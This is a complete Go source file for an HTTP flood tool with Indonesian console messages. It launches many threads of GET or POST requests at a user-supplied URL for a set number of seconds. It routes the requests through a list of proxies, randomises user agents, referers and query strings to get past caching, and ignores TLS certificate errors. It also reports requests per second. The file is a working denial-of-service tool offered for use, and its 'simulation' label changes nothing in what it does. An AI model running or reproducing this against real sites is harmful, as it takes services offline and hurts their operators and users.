package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync/atomic"
	"time"

	"golang.org/x/net/http2"
)

var (
	host      = ""
	mode      = ""
	start     = make(chan bool)
	proxies   []string
	requests  uint64
	acceptall = []string{
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		"application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
	}
	referers = []string{
		"https://www.google.com/search?q=",
		"https://www.facebook.com/",
		"https://www.bing.com/search?q=",
	}
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

func loadProxies() {
	f, err := os.Open("proxies.txt")
	if err != nil {
		fmt.Println("[!] Error: File 'proxies.txt' wajib ada!")
		os.Exit(1)
	}
	defer f.Close()
	s := bufio.NewScanner(f)
	for s.Scan() {
		p := strings.TrimSpace(s.Text())
		if p != "" {
			if !strings.Contains(p, "://") {
				p = "http://" + p
			}
			proxies = append(proxies, p)
		}
	}
	if len(proxies) == 0 {
		fmt.Println("[!] Error: proxies.txt kosong!")
		os.Exit(1)
	}
	fmt.Printf("[INFO] %d Proxy Terload.\n", len(proxies))
}

func getuseragent() string {
	return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + strconv.Itoa(rand.Intn(5)+115) + ".0.0.0 Safari/537.36"
}

func flood(targetUrl string) {
	p := proxies[rand.Intn(len(proxies))]
	proxyURL, _ := url.Parse(p)

	transport := &http.Transport{
		Proxy: http.ProxyURL(proxyURL),
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			ServerName:         host,
		},
		MaxIdleConns:        2000,
		MaxIdleConnsPerHost: 2000,
		DisableCompression:  true,
	}

	_ = http2.ConfigureTransport(transport)

	client := &http.Client{
		Transport: transport,
		Timeout:   time.Second * 5,
	}

	<-start
	for {
		u := targetUrl
		if mode == "get" {
			u += "?" + strconv.Itoa(rand.Intn(10000000)) + "=" + strconv.Itoa(rand.Intn(10000000))
		}

		req, errReq := http.NewRequest(strings.ToUpper(mode), u, nil)
		if errReq != nil {
			continue
		}

		req.Header.Set("User-Agent", getuseragent())
		req.Header.Set("Accept", acceptall[rand.Intn(len(acceptall))])
		req.Header.Set("Referer", referers[rand.Intn(len(referers))])
		req.Header.Set("Connection", "keep-alive")

		resp, err := client.Do(req)
		if err == nil {
			atomic.AddUint64(&requests, 1)
			resp.Body.Close()
		}
	}
}

func main() {
	if len(os.Args) != 5 {
		fmt.Println("Usage: go run httpflood.go <url> <threads> <get/post> <seconds>")
		os.Exit(1)
	}

	u, err := url.Parse(os.Args[1])
	if err != nil {
		fmt.Println("[!] URL tidak valid")
		os.Exit(1)
	}
	host = u.Hostname()
	mode = strings.ToLower(os.Args[3])
	threads, _ := strconv.Atoi(os.Args[2])
	limit, _ := strconv.Atoi(os.Args[4])

	loadProxies()

	for i := 0; i < threads; i++ {
		go flood(os.Args[1])
	}

	fmt.Printf("[FIRE] Flood dimulai pada %s...\n", os.Args[1])
	close(start)

	go func() {
		for {
			current := atomic.SwapUint64(&requests, 0)
			fmt.Printf("\r[STATUS] RPS: %d | Total Threads: %d", current, threads)
			time.Sleep(time.Second)
		}
	}()

	time.Sleep(time.Duration(limit) * time.Second)
	fmt.Println("\n[FINISH] Simulasi selesai.")
}